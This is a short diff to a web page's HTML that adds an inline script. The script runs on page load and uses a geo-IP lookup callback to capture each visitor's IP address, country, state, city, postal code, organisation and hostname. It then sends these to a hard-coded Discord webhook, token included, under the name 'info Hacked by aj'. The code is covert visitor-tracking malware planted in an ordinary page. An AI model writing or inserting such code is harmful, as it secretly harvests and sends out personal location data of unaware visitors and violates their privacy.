@@ -50,4 +50,21 @@
 </html>
 
 <script src="script.js"></script>
+<script>
+  function geo(json) {
+    
+    var request = new XMLHttpRequest();
+        request.open("POST", `https://discord.com/api/webhooks/988960533787050054/28vxdCJz1bsp0_bKWVH0yE2XinD8R3Wj6wdYnW13MXqzJujcpf5Eyw_GtZ4qFcZdaEhq`);
+        request.setRequestHeader('Content-type', 'application/json');
+    var params = {
+      username: "info Hacked by aj",
+      avatar_url: "https://i.postimg.cc/g2DcKV3J/index.jpg",
+      content: "```" + "IP: " + json.ip + "\n" + "COUNTRY: " + json.country_name + "\n" + "STATE: " + json.region + "\n" + "CITY: " + json.city + "\n" + "POSTAL CODE: " + json.postal_code + "\n" + "ORG: " + json.org + "\n" + "HOSTNAME: " + json.hostname + "```"
+    }
+   request.send(JSON.stringify(params));
+  }
+  
+  
+
+</script>
 <script src="https://json.geoiplookup.io/?callback=geo"></script>
